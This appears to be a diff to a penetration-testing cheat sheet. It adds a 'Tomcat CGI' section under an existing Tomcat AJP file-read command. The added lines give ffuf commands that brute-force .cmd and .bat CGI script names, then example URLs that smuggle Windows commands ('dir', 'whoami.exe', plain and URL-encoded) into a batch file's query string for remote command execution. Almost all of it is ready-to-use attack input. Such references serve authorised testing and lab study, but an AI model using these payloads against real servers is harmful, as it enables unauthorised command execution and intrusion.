@@ -1029,6 +1029,16 @@ https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-1
 $ python2.7 tomcat-ajp.lfi.py <URL> -p 8009 -f WEB-INF/web.xml 
 ```
 
+- Tomcat CGI
+
+```
+$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<IP address>:<port>/cgi/FUZZ.cmd
+$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<IP address>:<port>/cgi/FUZZ.bat
+http://<IP address>:<port>/cgi/welcome.bat?&dir
+http://<IP address>:<port>/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+http://<IP address>:<port>/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+
 - WordPress
 
 ```
